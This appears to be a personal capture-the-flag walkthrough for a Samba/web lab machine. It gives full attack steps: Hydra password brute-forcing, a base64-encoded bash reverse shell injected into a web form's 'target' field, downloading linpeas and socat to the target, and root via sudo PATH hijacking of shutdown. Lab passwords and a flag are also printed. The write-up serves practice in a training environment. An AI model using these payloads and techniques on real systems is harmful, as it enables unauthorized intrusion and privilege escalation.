@@ -1,0 +1,184 @@
+We do an NMAP scan and see that port 80 is open
+	When we try to go into port 80 we need a username and password
+	We have both port 139 and 445, these are both SMB ports
+	This means that we are dealing with a windows computer with older SMB ports on them...
+Doing an NMAP and just those two ports we can find more information
+	nmap -sC -p 445 -vv 10.10.209.87
+	nmap -sC -p 139 -vv 10.10.209.87
+Looking up CVE details for Samba 4.7.6 we see that there are different attacks that can be done
+I opened metasploit and started going through some of the different vulns with samba
+When I couldnt get any usernames I decided to use something we have used before
+	enum4linux 10.10.209.87
+	This game us some information
+|    Share Enumeration on 10.10.209.87    |
+ ========================================= 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	yotf            Disk      Fox's Stuff -- keep out!
+	IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on 10.10.209.87
+//10.10.209.87/yotf	Mapping: DENIED, Listing: N/A
+//10.10.209.87/IPC$	[E] Can't understand response:
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+
+|    Users on 10.10.209.87    |
+ ============================= 
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: fox	Name: fox	Desc: 
+
+user:[fox] rid:[0x3e8]
+
+Looking through there I saw cant understand response and also saw Fox's stuff keep out
+I also noticed that the min pass length is 5, they never expire and account lockout duration is 30 minutes
+	WE DONT WANT TO LOCK OUT AN ACCOUNT
+	The lockout account threshold is none, so we can bruteforce if needed
+We also see a user, fox, but enum4linux is still running so we are going to see if we can find anyone else and hopefully a password
+While enum4linux was running I decided to do a gobuster
+	Nothing
+Although it takes a minute enum4linux is done and we find this
+	S-1-22-1-1000 Unix User\fox (Local User)
+	S-1-22-1-1001 Unix User\rascal (Local User)
+The two things we want to look at are most likely going to be rascal and yotf
+Lets hydra rascal
+	hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.209.87 http-head /
+Now we wait and see if we get anything...
+This could take a while, I noticed that each time you get a password it is different... 
+We got ourselves a password
+	hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.209.87 http-head /
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-07 21:15:08
+[WARNING] http-head auth does not work with every server, better use http-get
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-head://10.10.209.87:80/
+[STATUS] 2939.00 tries/min, 2939 tries in 00:01h, 14341460 to do in 81:20h, 16 active
+[STATUS] 2942.67 tries/min, 8828 tries in 00:03h, 14335571 to do in 81:12h, 16 active
+[80][http-head] host: 10.10.209.87   login: rascal   password: gordon1
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-07 21:20:11
+
+We come up on a search engine
+I tried to do a directory buster on it and didn't get anything back
+I had nothing in there and clicked search and three files appeared
+I guess it is time to use burpsuite again...
+	first lets get a proxy going
+From here i realized that we can type in the target field...
+	This means that we should be able to execute commands
+	lets try and get a reverse shell
+		I also noticed when typing in the field that different characters were santized such as / " ' ; and all other coding characters
+		since they were automatically sanitized we are going to convert a reverse shell in base 64
+
+echo "bash -i >& /dev/tcp/10.6.23.228/4444 0>&1" | base64
+	MAKE SURE TO CHANGE YOUR IP AND LISTENING PORT
+the out put i get is this
+	YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC42LjIzLjIyOC80NDQ0IDA+JjEK
+we now have base64 code, lets open a listening port and see if we can utilize the base64 to get in
+when burpsuit is running click search again
+at the bottom you should see target ""
+now we are going to insert our code into target
+	{"target":"\";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC42LjIzLjIyOC80NDQ0IDA+JjEK | base64 -d | bash \n"}
+remember before pressing forward open a listening port 
+	nc -lvp 4444
+If you did not put your command in base64 an error would come back on the page of invalid arugments, or characters
+	looking through this we see a search.php
+going back to our root folder cd ~ we cna find web-flag.txt
+	cool there is one flag down
+we also see a files folder, this should have the files that we saw eariler when first pressing search on the website
+	it does lets look at those
+www-data@year-of-the-fox:/var/www/files$ ls -la
+ls -la
+total 12
+drwxr-xr-x 2 root root 4096 May 31  2020 .
+drwxr-xr-x 4 root root 4096 May 31  2020 ..
+-rw-r--r-- 1 root root  154 May 31  2020 creds2.txt
+-rw-r--r-- 1 root root    0 May 31  2020 fox.txt
+-rw-r--r-- 1 root root    0 May 31  2020 important-data.txt
+www-data@year-of-the-fox:/var/www/files$ cat creds2.txt
+cat creds2.txt
+LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAX
+UTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=
+www-data@year-of-the-fox:/var/www/files$ cat fox.txt
+cat fox.txt
+www-data@year-of-the-fox:/var/www/files$ cat important-data.txt
+cat important-data.txt
+www-data@year-of-the-fox:/var/www/files$ 
+
+The only thing we really see is something in creds2.txt, however it doesn't seem to be hashed, a hash does not exist for it
+Lets use linpeas.sh which can help to find escalation paths 
+	First download
+wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+Now make a webserver on your linux machine
+	python -m SimpleHTTPServer 6666
+Now we need to get linpeas on the target machine and do a change mode
+	cd /tmp
+	wget http://10.6.23.228:6666/linpeas.sh
+	chmod +x linpeas.sh
+now doing a ls -la we can see that linpeas is executable
+lets execute it
+	./linpeas.sh
+This may take a little bit
+	Now that it is done lets start scrolling through everything
+	looking near the top we can see that port 22 is open, it is just to a loopback address
+	this means we would never see it during a port scan...
+	so how do we utilize port 22 if it is pointing at a loopback address?
+	lets use a program called socat
+First we need to download the binary for socat onto our kali machine
+	https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
+Now we need to put socat on the target machine
+	cd /tmp
+wget http://10.6.23.228:6666/socat
+	make sure you change the mode for socat to executable (same thing we did above)
+./socat tcp-listen:6666,reuseaddr,fork tcp:localhost:22	
+Now if we run another nmap scan we can see that we have port 6666 open, which should correspond to ssh
+remmeber in the beginning we found fox and rascal
+	since fox didnt work with the webpage, maybe he will work with ssh, lets try
+Mine showed up on 8888 for some reason, so I decided to try and use that port, if it does not work i can always reload the socat command
+	hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.163.58:6666
+The password changes with each shutdown of the activity so here it is 
+	[6666][ssh] host: 10.10.163.58   login: fox   password: leanne
+Now lets login
+	ssh fox@10.10.163.58 -p 6666
+Awesome we are in
+	ls -la shows us user-flag.txt
+cat user-flag.txt
+	THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}
+Doing a sudo -l we can see that fox is allowed to shutdown
+	we have seen something like this before...
+lets first do an echo $PATH
+This command shows us how commands are excuted by a user, and where to pull the binary from
+Now that we have where everything is being executed (bin) lets see if we can find anything in shutdown
+	first start a http.server on foxes machine
+		cd /usr/sbin 
+		python3 -m http.server
+		we can see a server stared on 8000
+First we are going to (on our local kali linux machine) retrieve the shutdown command that is allowed by fox
+		Now going to our kali machine
+		wget http://10.10.156.179:8000/shutdown
+		strings shutdown
+Now that we can see the strings we find something called poweroff
+	that sure sounds like a shutdown to me
+Now we can manipulate poweroff to do something else, such as allow us to vertically escalate our priveleges
+lets copy /bin/bash to /tmp/poweroff
+	cp /bin/bash /tmp/poweroff
+Now lets change the PATH variable
+	sudo "PATH=/tmp:$PATH" /usr/sbin/shutdown 
+AND WE ARE ROOT
+	now lets find root.txt
+cd /root
+	ls -la
+cat root.txt
+	NOT HERE!!!
+ok... this is ok... we are still root... this is horrible
+Now time to start searching
+Going into rascals folder we finally find it!!!
+	When pasting it you do have to get rid of the spaces, now lets see what is underneath
+I ran it throught a couple of decoders, at one point it was most likely the email to win the prizes listed
+However now it is nothing more than a base 64 and then when decoded just a set of letters
+	a0274786e2a627078666d6467797046666766683b693232353a6968303
+
+
+
+
